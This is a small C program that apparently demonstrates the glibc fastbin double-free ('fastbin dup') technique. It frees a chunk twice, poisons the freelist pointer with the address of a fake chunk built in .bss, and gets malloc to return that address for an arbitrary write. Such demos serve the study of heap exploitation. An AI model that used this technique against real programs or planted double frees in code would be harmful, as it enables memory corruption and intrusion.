#include<stdio.h>
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

void main() {
  //构造0x28(index=2-2=0)的fake chunk
  bss_chunk.size=0x28;

  char *p = malloc(0x10);
  char *p1 = malloc(0x10);
  free(p);
  free(p1);
  free(p);

  char *p2 = malloc(0x10);
  *(long long*)p2 = &bss_chunk;
  char *p3 = malloc(0x10);
  char *p4 = malloc(0x10);
  
  char *fake_chunk = malloc(0x10);
  *(long long *)fake_chunk = 0xffffffffff;
  printf("%x", bss_chunk.fd);
}
